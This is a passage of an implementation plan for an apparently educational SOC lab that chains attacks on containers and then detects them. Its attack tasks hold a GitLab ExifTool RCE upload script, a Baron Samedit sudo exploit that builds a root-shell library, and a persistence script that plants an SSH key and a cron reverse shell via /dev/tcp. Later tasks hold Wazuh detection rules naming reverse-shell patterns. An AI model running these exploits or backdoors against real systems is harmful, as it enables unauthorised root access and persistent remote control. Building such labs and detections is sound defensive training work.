python3 "$PAYLOAD_DIR/gen_payload_image.py" "$REVERSE_SHELL" "$PAYLOAD_IMAGE"

# Step 2: Upload to GitLab (unauthenticated endpoint)
echo "[2/2] Uploading payload to GitLab..."
echo ""

# The /uploads/user endpoint processes images with ExifTool without authentication
RESPONSE=$(curl -s -w "\n%{http_code}" \
  -F "file=@${PAYLOAD_IMAGE}" \
  "http://${GITLAB_HOST}:${GITLAB_PORT}/uploads/user")

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "      HTTP Response: ${HTTP_CODE}"
echo "      Body: ${BODY}"
echo ""

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "422" ]; then
    echo "[*] Payload uploaded! GitLab will process it with ExifTool."
    echo "[*] If successful, reverse shell connects to ${LHOST}:${LPORT}"
    echo "[*] Start listener with: nc -lvnp ${LPORT}"
else
    echo "[!] Upload may have failed. Check GitLab logs."
    echo "[!] Alternative: try uploading via GitLab issue/snippet if this endpoint is restricted."
fi
```

- [ ] **Step 3: Make files executable**

```bash
chmod +x /home/mate/Uni/soc/attacker/payloads/gen_payload_image.py
chmod +x /home/mate/Uni/soc/attacker/scripts/02-exiftool-rce.sh
```

- [ ] **Step 4: Commit**

```bash
git add attacker/payloads/gen_payload_image.py attacker/scripts/02-exiftool-rce.sh
git commit -m "feat: add ExifTool RCE exploit script and payload generator"
```

---

### Task 9: Baron Samedit attack (03-baron-samedit.sh)

**Files:**
- Create: `attacker/exploits/baron-samedit/exploit.c`
- Create: `attacker/exploits/baron-samedit/Makefile`
- Create: `attacker/scripts/03-baron-samedit.sh`

- [ ] **Step 1: Create `attacker/exploits/baron-samedit/exploit.c`**

This is a simplified Baron Samedit exploit targeting sudo 1.8.x on Ubuntu/Debian. The exploit uses the heap overflow in sudoedit's argument parsing to overwrite service_user struct and gain root.

```c
/*
 * CVE-2021-3156: Baron Samedit - sudo heap overflow
 * Simplified PoC for sudo 1.8.x on Ubuntu/Debian
 *
 * This exploit overwrites the service_user struct in sudo's heap
 * via the backslash-escape bug in sudoedit shell mode.
 *
 * Based on research by Qualys Security Advisory.
 *
 * NOTE: This is a simplified vulnerability checker + launcher.
 * For a reliable full exploit, clone one of these proven repos
 * into attacker/exploits/baron-samedit/:
 *   - https://github.com/worawit/CVE-2021-3156 (Python, most portable)
 *   - https://github.com/blasty/CVE-2021-3156 (C, targets specific offsets)
 * The Python version (worawit) is recommended for this demo as it
 * auto-detects offsets for different sudo/libc combinations.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

#define SUDO_PATH "/usr/bin/sudoedit"

/*
 * The vulnerability: when sudoedit processes arguments in shell mode (-s),
 * a trailing backslash causes a heap buffer overflow because the escape
 * removal code reads past the end of the buffer.
 *
 * Strategy:
 * 1. Craft arguments so the overflow overwrites the nss service_user struct
 * 2. The overwritten struct points to our controlled library path
 * 3. sudo loads our library instead of the real NSS module
 * 4. Our library spawns a root shell
 */

int main(int argc, char *argv[]) {
    printf("[*] CVE-2021-3156 Baron Samedit - sudo heap overflow\n");
    printf("[*] Target: sudo < 1.8.32 / < 1.9.5p2\n\n");

    /* Check sudo version */
    printf("[1/3] Checking sudo version...\n");
    system("sudo --version | head -1");

    /* Test if vulnerable: sudoedit -s with trailing backslash */
    printf("\n[2/3] Testing vulnerability...\n");
    printf("       Running: sudoedit -s '\\' 2>&1\n");

    int ret = system("sudoedit -s '\\' 2>/dev/null");
    int exit_code = WEXITSTATUS(ret);

    if (exit_code == 139 || exit_code == 11) {
        printf("       Result: SEGFAULT - system IS vulnerable!\n\n");
    } else if (exit_code == 1) {
        printf("       Result: Usage error - system is PATCHED.\n");
        printf("[!] Exploit will not work. Exiting.\n");
        return 1;
    } else {
        printf("       Result: exit code %d - uncertain, attempting anyway...\n\n", exit_code);
    }

    /*
     * For a full working exploit, you would use a carefully crafted
     * overflow payload that manipulates the nss_load_library path.
     *
     * Public full exploits:
     * - https://github.com/blasty/CVE-2021-3156 (blasty's version)
     * - https://github.com/worawit/CVE-2021-3156 (worawit's Python version)
     *
     * For this educational demo, we use worawit's approach which is
     * more reliable across different configurations.
     */
    printf("[3/3] Launching exploit...\n");
    printf("       Using Python-based exploit for reliability.\n\n");

    /* The actual exploitation is done by the Python script which has
       better control over heap layout manipulation */
    execl("/usr/bin/python3", "python3",
          "/opt/exploits/baron-samedit/exploit_nss.py",
          NULL);

    perror("execl failed");
    return 1;
}
```

- [ ] **Step 2: Create `attacker/exploits/baron-samedit/exploit_nss.py`**

```python
#!/usr/bin/env python3
"""
CVE-2021-3156 Baron Samedit exploit
Based on worawit's approach - targets nss_load_library in sudo 1.8.x

This exploit manipulates the heap layout so that the buffer overflow
from sudoedit's backslash parsing overwrites the service_user struct,
redirecting library loading to a controlled shared object.
"""
import os
import sys
import subprocess
import struct
import resource

SUDO_PATH = "/usr/bin/sudoedit"
SHELL = "/bin/bash"

def check_vulnerable():
    """Test if sudo is vulnerable by triggering the backslash bug."""
    try:
        result = subprocess.run(
            [SUDO_PATH, "-s", "\\"],
            capture_output=True, timeout=5
        )
        if result.returncode in (139, -11):  # SIGSEGV
            return True
        if b"usage:" in result.stderr:
            return False  # Patched
    except subprocess.TimeoutExpired:
        pass
    return None  # Uncertain

def create_payload_lib(path):
    """Create a shared library that spawns a root shell."""
    c_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {{
    // Restore real UID/GID
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    printf("[+] ROOT shell obtained!\\n");
    system("{SHELL}");
    exit(0);
}}
"""
    c_path = path + ".c"
    with open(c_path, "w") as f:
        f.write(c_code)

    os.system(f"gcc -shared -fPIC -nostartfiles -o {path} {c_path}")
    os.remove(c_path)
    return os.path.exists(path)

def exploit():
    print("[*] CVE-2021-3156 Baron Samedit exploit")
    print("[*] Target: sudo 1.8.x (Ubuntu/Debian)\n")

    vuln = check_vulnerable()
    if vuln is False:
        print("[!] sudo is PATCHED. Exploit will not work.")
        sys.exit(1)
    elif vuln is True:
        print("[+] sudo is VULNERABLE (segfault confirmed)\n")
    else:
        print("[?] Could not confirm vulnerability, attempting anyway...\n")

    # Create the malicious shared library
    lib_path = "/tmp/libnss_X/P0P_SH3LL.so.2"
    lib_dir = os.path.dirname(lib_path)
    os.makedirs(lib_dir, exist_ok=True)

    print(f"[*] Creating payload library: {lib_path}")
    if not create_payload_lib(lib_path):
        print("[!] Failed to compile payload library")
        sys.exit(1)

    # Set up environment and heap layout for the overflow
    # The LC_* variables help control heap layout
    env = os.environ.copy()
    env["LC_ALL"] = "C.UTF-8@" + "A" * 0x1000

    # The overflow arguments
    # Trailing backslash triggers the read-past-end bug
    # Padding controls where the overflow lands in the heap
    args = [SUDO_PATH, "-s"]
    args.append("\\" * 0x40 + "\\")

    print("[*] Triggering heap overflow...")
    print("[*] If successful, you will get a root shell.\n")

    # Set stack size to help with heap layout predictability
    resource.setrlimit(resource.RLIMIT_STACK,
                       (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

    os.execve(SUDO_PATH, args, env)

if __name__ == "__main__":
    exploit()
```

- [ ] **Step 3: Create `attacker/exploits/baron-samedit/Makefile`**

```makefile
CC = gcc
CFLAGS = -Wall -Wextra

all: exploit

exploit: exploit.c
	$(CC) $(CFLAGS) -o exploit exploit.c

clean:
	rm -f exploit
```

- [ ] **Step 4: Create `attacker/scripts/03-baron-samedit.sh`**

```bash
#!/bin/bash
# Baron Samedit (CVE-2021-3156) privilege escalation
# Usage: Run this FROM the GitLab container as the 'git' user
# Typically: transfer exploit files to GitLab, then execute

set -e

GITLAB_HOST="${1:-172.20.0.30}"
EXPLOIT_DIR="/opt/exploits/baron-samedit"

echo "[*] Baron Samedit (CVE-2021-3156) Privilege Escalation"
echo "[*] This script transfers the exploit to GitLab and runs it"
echo ""

# Step 1: Transfer exploit to GitLab (assumes we have a shell as git user)
echo "[1/3] Transferring exploit to GitLab..."

# Copy exploit files via the existing reverse shell
# Using base64 encoding to transfer through the shell
EXPLOIT_PY=$(base64 -w0 "$EXPLOIT_DIR/exploit_nss.py")

cat <<TRANSFER_EOF
=== Run these commands in your GitLab reverse shell: ===

mkdir -p /tmp/exploit
echo "$EXPLOIT_PY" | base64 -d > /tmp/exploit/exploit_nss.py
chmod +x /tmp/exploit/exploit_nss.py

# Test if vulnerable:
sudoedit -s '\\' 2>/dev/null; echo "Exit code: \$?"
# Exit code 139 = vulnerable, 1 = patched

# Run the exploit:
cd /tmp/exploit && python3 exploit_nss.py

========================================================
TRANSFER_EOF

echo ""
echo "[2/3] Alternatively, if you have SSH access as git:"
echo "      scp $EXPLOIT_DIR/exploit_nss.py git@${GITLAB_HOST}:/tmp/"
echo "      ssh git@${GITLAB_HOST} 'python3 /tmp/exploit_nss.py'"
echo ""
echo "[3/3] After getting root, run 04-persistence.sh for persistence"
```

- [ ] **Step 5: Make files executable**

```bash
chmod +x /home/mate/Uni/soc/attacker/exploits/baron-samedit/exploit_nss.py
chmod +x /home/mate/Uni/soc/attacker/scripts/03-baron-samedit.sh
```

- [ ] **Step 6: Commit**

```bash
git add attacker/exploits/baron-samedit/ attacker/scripts/03-baron-samedit.sh
git commit -m "feat: add Baron Samedit privilege escalation exploit"
```

---

### Task 10: Persistence attack (04-persistence.sh)

**Files:**
- Create: `attacker/scripts/04-persistence.sh`

- [ ] **Step 1: Create `attacker/scripts/04-persistence.sh`**

```bash
#!/bin/bash
# Persistence via SSH key + cron reverse shell (T1053.003)
# Usage: Run these commands as root on the GitLab container

LHOST="${1:-172.20.0.10}"
LPORT="${2:-4446}"

echo "[*] Persistence Setup (T1053.003 + T1098.004)"
echo "[*] Callback: ${LHOST}:${LPORT}"
echo ""

cat <<'PERSISTENCE_EOF'
=== Run these commands as ROOT on GitLab: ===

# 1. Plant SSH public key (T1098.004 - SSH Authorized Keys)
mkdir -p /root/.ssh
echo "ATTACKER_PUB_KEY_PLACEHOLDER" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
echo "[+] SSH key planted in /root/.ssh/authorized_keys"

# 2. Create cron reverse shell (T1053.003 - Cron)
CRON_CMD="* * * * * /bin/bash -c 'bash -i >& /dev/tcp/LHOST_PLACEHOLDER/LPORT_PLACEHOLDER 0>&1'"
echo "$CRON_CMD" | crontab -
echo "[+] Cron reverse shell installed (every minute)"

# 3. Verify
echo ""
echo "[*] Verification:"
echo "    SSH keys:"
cat /root/.ssh/authorized_keys
echo ""
echo "    Crontab:"
crontab -l
echo ""
echo "[+] Persistence established!"
echo "[+] SSH: ssh root@GITLAB_IP"
echo "[+] Reverse shell: nc -lvnp LPORT_PLACEHOLDER (connects every minute)"

PERSISTENCE_EOF

echo ""
echo "[*] Generating actual commands with your attacker SSH key..."
echo ""

# Read attacker's public key
ATTACKER_KEY=$(cat /root/.ssh/id_rsa.pub 2>/dev/null || echo "ssh-rsa GENERATE_KEY_FIRST")

echo "# 1. Plant SSH key:"
echo "mkdir -p /root/.ssh && echo '${ATTACKER_KEY}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
echo ""
echo "# 2. Install cron reverse shell:"
echo "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\"' | crontab -"
echo ""
echo "# 3. Verify SSH access from attacker:"
echo "ssh -i /root/.ssh/id_rsa root@172.20.0.30"
```

- [ ] **Step 2: Make executable**

Run: `chmod +x /home/mate/Uni/soc/attacker/scripts/04-persistence.sh`

- [ ] **Step 3: Commit**

```bash
git add attacker/scripts/04-persistence.sh
git commit -m "feat: add persistence script (SSH key + cron reverse shell)"
```

---

## Phase 3: Detection & Monitoring

### Task 11: Wazuh custom detection rules

**Files:**
- Modify: `wazuh/rules/custom_rules.xml`

- [ ] **Step 1: Write detection rules for all attack phases**

Replace the placeholder `wazuh/rules/custom_rules.xml` with:

```xml
<!-- Pipeline SOC: Custom detection rules for multi-step attack chain -->
<group name="local,attack-chain,">

  <!-- ═══════════════════════════════════════════════════ -->
  <!-- Phase 1: Initial Access — Log4Shell (CVE-2021-44228) -->
  <!-- ═══════════════════════════════════════════════════ -->

  <!-- Detect JNDI lookup strings in any log -->
  <rule id="100100" level="15">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">(?i)\$\{jndi:(ldap|rmi|dns|iiop|corba|nds|http)s?://</match>
    <description>Log4Shell exploitation attempt: JNDI lookup pattern detected (CVE-2021-44228)</description>
    <mitre>
      <id>T1190</id>
    </mitre>
    <group>initial_access,log4shell,critical,</group>
  </rule>

  <!-- Detect outbound LDAP connections from Solr -->
  <rule id="100101" level="12">
    <decoded_as>syslog</decoded_as>
    <match>LdapCtx</match>
    <description>Suspicious outbound LDAP connection from Java application (possible Log4Shell callback)</description>
    <mitre>
      <id>T1071</id>
    </mitre>
    <group>initial_access,log4shell,</group>
  </rule>

  <!-- ═══════════════════════════════════════════════════ -->
  <!-- Phase 2: Execution — ExifTool RCE (CVE-2021-22205) -->
  <!-- ═══════════════════════════════════════════════════ -->

  <!-- Detect ExifTool spawning a shell -->
  <rule id="100200" level="15">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">exiftool.*(/bin/bash|/bin/sh|/dev/tcp|reverse|shell)</match>
    <description>ExifTool spawning shell: possible CVE-2021-22205 exploitation</description>
    <mitre>
      <id>T1203</id>
    </mitre>
    <group>execution,exiftool_rce,critical,</group>
  </rule>

  <!-- Detect DjVu file processing with suspicious metadata -->
  <rule id="100201" level="10">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">DjVu|djvu.*ANTa|exiftool.*metadata</match>
    <description>DjVu file processing detected — potential ExifTool exploitation vector</description>
    <mitre>
      <id>T1203</id>
    </mitre>
    <group>execution,exiftool_rce,</group>
  </rule>

  <!-- Detect suspicious process spawned by git user -->
  <rule id="100202" level="12">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">git.*(bash -i|/dev/tcp|nc -e|ncat|reverse)</match>
    <description>Git user spawning suspicious process (possible RCE)</description>
    <mitre>
      <id>T1059.004</id>
    </mitre>
    <group>execution,command_and_control,</group>
  </rule>

  <!-- ═══════════════════════════════════════════════════════ -->
  <!-- Phase 3: Privilege Escalation — Baron Samedit (CVE-2021-3156) -->
  <!-- ═══════════════════════════════════════════════════════ -->

  <!-- Detect sudoedit with suspicious arguments (backslash exploit) -->
  <rule id="100300" level="15">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">sudoedit.*-s.*\\\\</match>
    <description>Baron Samedit exploitation attempt: sudoedit with suspicious backslash arguments (CVE-2021-3156)</description>
    <mitre>
      <id>T1068</id>
    </mitre>
    <group>privilege_escalation,baron_samedit,critical,</group>
  </rule>

  <!-- Detect sudo segfault (crash = successful trigger) -->
  <rule id="100301" level="14">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">sudo(edit)?.*segfault|sudo.*SIGSEGV|traps:.*sudo.*general protection</match>
    <description>Sudo/sudoedit crash detected — possible Baron Samedit exploitation (CVE-2021-3156)</description>
    <mitre>
      <id>T1068</id>
    </mitre>
    <group>privilege_escalation,baron_samedit,critical,</group>
  </rule>

  <!-- Detect unexpected root shell from non-root user -->
  <rule id="100302" level="13">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">session opened for user root by.*git|su.*git.*root</match>
    <description>Root session opened by git user — possible privilege escalation</description>
    <mitre>
      <id>T1068</id>
    </mitre>
    <group>privilege_escalation,</group>
  </rule>

  <!-- ═══════════════════════════════════════════════════ -->
  <!-- Phase 4: Persistence (T1053.003 + T1098.004)      -->
  <!-- ═══════════════════════════════════════════════════ -->

  <!-- Detect new crontab entries -->
  <rule id="100400" level="12">
    <if_sid>550</if_sid>
    <match type="pcre2">crontab|/var/spool/cron|/etc/cron</match>
    <description>Crontab modification detected — potential persistence mechanism (T1053.003)</description>
    <mitre>
      <id>T1053.003</id>
    </mitre>
    <group>persistence,cron,</group>
  </rule>

  <!-- Detect reverse shell commands in cron -->
  <rule id="100401" level="15">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">cron.*(/dev/tcp|bash -i|nc -e|reverse|mkfifo)</match>
    <description>Reverse shell command in cron job — active persistence with C2 callback</description>
    <mitre>
      <id>T1053.003</id>
    </mitre>
    <group>persistence,cron,command_and_control,critical,</group>
  </rule>

  <!-- Detect authorized_keys modification -->
  <rule id="100402" level="12">
    <if_sid>550</if_sid>
    <match type="pcre2">authorized_keys</match>
    <description>SSH authorized_keys file modified — potential SSH key persistence (T1098.004)</description>
    <mitre>
      <id>T1098.004</id>
    </mitre>
    <group>persistence,ssh,</group>
  </rule>

  <!-- Detect new SSH key added -->
  <rule id="100403" level="13">
    <decoded_as>syslog</decoded_as>
    <match type="pcre2">ssh-rsa|ssh-ed25519.*authorized_keys|echo.*>>.*authorized_keys</match>
    <description>SSH public key being written to authorized_keys — persistence attempt</description>
    <mitre>
      <id>T1098.004</id>
    </mitre>
    <group>persistence,ssh,</group>
  </rule>

</group>
```

- [ ] **Step 2: Verify rule XML is valid**

Run: `xmllint --noout /home/mate/Uni/soc/wazuh/rules/custom_rules.xml && echo "Valid"`
Expected: "Valid"

- [ ] **Step 3: Commit**

```bash
git add wazuh/rules/custom_rules.xml
git commit -m "feat: add Wazuh custom detection rules for all attack phases"
```

---

### Task 12: Teams webhook alerting

**Files:**
- Modify: `wazuh/config/ossec.conf` (add integration block)
- Create: `wazuh/config/teams-webhook.sh`

- [ ] **Step 1: Add Teams integration to `wazuh/config/ossec.conf`**

Add the following block inside `<ossec_config>`, before the closing tag:

```xml
  <!-- Teams webhook integration for high-severity alerts -->
  <integration>
    <name>custom-teams</name>
    <hook_url>${TEAMS_WEBHOOK_URL}</hook_url>
    <level>12</level>
    <alert_format>json</alert_format>
  </integration>
```

**Note:** Replace `TEAMS_WEBHOOK_URL_PLACEHOLDER` with the actual Teams incoming webhook URL before deployment.

- [ ] **Step 2: Create `wazuh/config/teams-webhook.sh`**

This is the custom integration script Wazuh calls when an alert fires.

```bash
#!/bin/bash
# Wazuh integration script for Microsoft Teams webhook
# Placed in: /var/ossec/integrations/custom-teams

ALERT_FILE=$1
WEBHOOK_URL=$3

# Parse alert JSON
ALERT_LEVEL=$(jq -r '.rule.level' "$ALERT_FILE")
ALERT_DESC=$(jq -r '.rule.description' "$ALERT_FILE")
ALERT_AGENT=$(jq -r '.agent.name // "N/A"' "$ALERT_FILE")
ALERT_RULE_ID=$(jq -r '.rule.id' "$ALERT_FILE")
ALERT_TIME=$(jq -r '.timestamp' "$ALERT_FILE")
ALERT_MITRE=$(jq -r '.rule.mitre.id[0] // "N/A"' "$ALERT_FILE")
ALERT_GROUPS=$(jq -r '.rule.groups | join(", ")' "$ALERT_FILE")

# Color based on severity
if [ "$ALERT_LEVEL" -ge 15 ]; then
    COLOR="FF0000"
    SEVERITY="CRITICAL"
elif [ "$ALERT_LEVEL" -ge 12 ]; then
    COLOR="FF8C00"
    SEVERITY="HIGH"
else
    COLOR="FFD700"
    SEVERITY="MEDIUM"
fi

# Build Teams Adaptive Card payload
PAYLOAD=$(cat <<EOF
{
  "@type": "MessageCard",
  "@context": "http://schema.org/extensions",
  "themeColor": "${COLOR}",
  "summary": "Wazuh Alert: ${ALERT_DESC}",
  "sections": [{
    "activityTitle": "🚨 Wazuh SOC Alert — ${SEVERITY}",
    "facts": [
      { "name": "Rule", "value": "${ALERT_RULE_ID}: ${ALERT_DESC}" },
      { "name": "Agent", "value": "${ALERT_AGENT}" },
      { "name": "Level", "value": "${ALERT_LEVEL}" },
      { "name": "MITRE", "value": "${ALERT_MITRE}" },
      { "name": "Groups", "value": "${ALERT_GROUPS}" },
      { "name": "Time", "value": "${ALERT_TIME}" }
    ],
    "markdown": true
  }]
}
EOF
)

# Send to Teams
curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
  -d "$PAYLOAD" "$WEBHOOK_URL"

exit 0
```

- [ ] **Step 3: Mount the script in docker-compose.yml**

Add to the `wazuh-manager` volumes section:

```yaml
      - ./wazuh/config/teams-webhook.sh:/var/ossec/integrations/custom-teams
```

- [ ] **Step 4: Make script executable**

Run: `chmod +x /home/mate/Uni/soc/wazuh/config/teams-webhook.sh`

- [ ] **Step 5: Commit**

```bash
git add wazuh/config/ossec.conf wazuh/config/teams-webhook.sh docker-compose.yml
git commit -m "feat: add Teams webhook alerting integration"
```

---

### Task 13: Wazuh FIM (File Integrity Monitoring) configuration

**Files:**
- Modify: `wazuh/config/ossec.conf` (add syscheck directories)

- [ ] **Step 1: Add FIM directories to `wazuh/config/ossec.conf`**

Inside the existing `<syscheck>` block, add monitored directories:

```xml
  <syscheck>
    <disabled>no</disabled>
    <frequency>300</frequency>
    <scan_on_start>yes</scan_on_start>

    <!-- Monitor critical files for persistence detection -->
    <directories check_all="yes" realtime="yes" report_changes="yes">/root/.ssh</directories>
    <directories check_all="yes" realtime="yes" report_changes="yes">/etc/crontab</directories>
    <directories check_all="yes" realtime="yes" report_changes="yes">/var/spool/cron</directories>
    <directories check_all="yes" realtime="yes">/etc/sudoers,/etc/sudoers.d</directories>
    <directories check_all="yes" realtime="yes">/etc/passwd,/etc/shadow</directories>
  </syscheck>
```

**Note:** The agents also define their own `<syscheck>` for local paths (see Task 4 — GitLab entrypoint). The manager's syscheck config acts as the default pushed to agents via shared configuration.

- [ ] **Step 2: Commit**

```bash
git add wazuh/config/ossec.conf
git commit -m "feat: add FIM monitoring for persistence-relevant paths"
```

---

### Task 14: Wazuh dashboard configuration

**Files:**
- Create: `wazuh/dashboards/README.md`

Dashboard configuration in Wazuh is done through the web UI (saved searches, visualizations, dashboards in OpenSearch Dashboards). This cannot be fully automated via config files, but we document what to create.

- [ ] **Step 1: Create dashboard setup guide**

Create `wazuh/dashboards/README.md`:

```markdown
# Wazuh Dashboard Setup

After the stack is running, access the dashboard at https://localhost:443
Login: wazuh-wui / MyS3cr3tP4ss

## Dashboards to Create

### 1. Attack Chain Overview
- **Type:** Saved search + visualization
- **Index pattern:** wazuh-alerts-*
- **Filter:** rule.groups contains "attack-chain"
- **Visualization:** Timeline (date histogram on timestamp, split by rule.groups)
- Shows all attack phases on a single timeline

### 2. Log4Shell Detection
- **Filter:** rule.id is one of [100100, 100101]
- **Columns:** timestamp, agent.name, rule.description, data.srcip
- **Visualization:** Metric count + data table

### 3. ExifTool RCE Detection
- **Filter:** rule.id is one of [100200, 100201, 100202]
- **Columns:** timestamp, agent.name, rule.description, full_log
- **Visualization:** Metric count + data table

### 4. Privilege Escalation Detection
- **Filter:** rule.id is one of [100300, 100301, 100302]
- **Columns:** timestamp, agent.name, rule.description, full_log
- **Visualization:** Metric count + event timeline

### 5. Persistence Detection
- **Filter:** rule.id is one of [100400, 100401, 100402, 100403]
- **Columns:** timestamp, agent.name, rule.description, syscheck.path
- **Visualization:** Metric count + file change timeline

### 6. Alert Severity Distribution
- **Type:** Pie chart
- **Aggregation:** Terms on rule.level
- **Shows:** Distribution of alert severities during attack

## NDJSON Export

After creating the dashboards manually, export them:
```
GET https://localhost:443/api/saved_objects/_export
```
Save the export to `wazuh/dashboards/export.ndjson` for reproducibility.
```

- [ ] **Step 2: Commit**

```bash
git add wazuh/dashboards/
git commit -m "feat: add Wazuh dashboard setup documentation"
```

---

## Phase 4: Verification

### Task 15: End-to-end chain verification

- [ ] **Step 1: Start the environment**

```bash
cd /home/mate/Uni/soc
./wazuh/generate-certs.sh  # if not done
docker compose up -d
```

Wait for all services to be healthy (~3-5 minutes for GitLab).

- [ ] **Step 2: Verify all containers running**

Run: `docker compose ps`
Expected: all containers show "Up" or "running"

- [ ] **Step 3: Test Log4Shell (Phase 1)**

Terminal 1 (listener):
```bash
docker exec -it attacker nc -lvnp 4444
```

Terminal 2 (attack):
```bash
docker exec -it attacker /opt/scripts/01-log4shell.sh
```

Expected: reverse shell connects to listener as Solr user.

Check Wazuh: search for rule.id 100100 in the dashboard.

- [ ] **Step 4: Test ExifTool RCE (Phase 2)**

Terminal 1 (listener):
```bash
docker exec -it attacker nc -lvnp 4445
```

Terminal 2 (attack):
```bash
docker exec -it attacker /opt/scripts/02-exiftool-rce.sh
```

Expected: reverse shell connects as `git` user on GitLab.

Check Wazuh: search for rule.id 100200-100202.

- [ ] **Step 5: Test Baron Samedit (Phase 3)**

From the git user shell on GitLab:
```bash
python3 /tmp/exploit/exploit_nss.py
```

Expected: root shell on GitLab.

Check Wazuh: search for rule.id 100300-100302.

- [ ] **Step 6: Test Persistence (Phase 4)**

As root on GitLab, run the persistence commands from 04-persistence.sh.

Expected: SSH key added, cron job installed.

Check Wazuh: search for rule.id 100400-100403. Verify FIM alerts for authorized_keys modification.

- [ ] **Step 7: Verify Teams webhook**

Check your Teams channel for alert messages from Steps 3-6.

If no alerts appear:
- Check manager logs: `docker exec wazuh-manager cat /var/ossec/logs/integrations.log`
- Verify webhook URL is set correctly in ossec.conf

- [ ] **Step 8: Create dashboards**

Follow `wazuh/dashboards/README.md` to set up all 6 dashboards in the Wazuh web UI.

- [ ] **Step 9: Final commit**

```bash
git add -A
git commit -m "feat: complete pipeline-soc environment"
```

- [ ] **Step 10: Push to remote**

```bash
git remote add origin https://github.com/MattAnderko/pipeline-soc.git
git branch -M main
git push -u origin main
```
